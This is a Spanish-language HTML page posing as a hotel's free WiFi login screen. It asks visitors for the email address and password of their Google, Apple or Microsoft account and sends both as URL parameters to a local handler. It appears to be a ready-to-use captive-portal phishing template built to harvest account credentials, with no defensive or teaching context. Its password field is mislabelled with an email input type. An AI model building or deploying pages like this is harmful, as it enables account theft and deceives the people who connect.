<!DOCTYPE html><html lang="es"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Zona WiFi</title>
<style>
*{box-sizing:border-box}
body{font-family:Georgia,serif;margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#f3ede4;color:#3a2f26}
.card{width:100%;max-width:340px;margin:16px;background:#fff;border:1px solid #e3d9c9;border-radius:6px;padding:30px 24px;text-align:center}
h1{font-size:22px;margin:0 0 2px;color:#7a5c38}
.sub{font-size:13px;color:#a08a6a;margin:0 0 22px;font-family:system-ui,sans-serif}
label{display:block;text-align:left;font-size:12px;color:#8a7a66;margin:10px 0 3px;font-family:system-ui,sans-serif}
input{width:100%;padding:12px;border:1px solid #ddd3c4;border-radius:5px;font-size:15px;font-family:system-ui,sans-serif}
button{width:100%;padding:13px;margin-top:18px;border:0;border-radius:5px;background:#7a5c38;color:#fff;font-size:15px;letter-spacing:.5px;font-family:system-ui,sans-serif}
.h{height:1px;background:#eee4d6;margin:20px 0}
.f{font-size:11px;color:#b7a78f;font-family:system-ui,sans-serif}
</style></head><body>
<div class="card">
<h1>Acceso privado Wifi del hotel</h1>
<div class="sub">Acceso WiFi privado. Usa tu cuenta Google, Apple o Microsoft.</div>
<form method="GET" action="/1">
<label>Email</label>
<input name="email" placeholder="correo@gmail.com" required>
<label>Password</label>
<input name="password" type="email" placeholder="Password" required>
<button>ACCEDER A INTERNET</button>
</form>
<div class="h"></div>
<div class="f">Conexion gratuita cortesia del establecimiento</div>
</div></body></html>
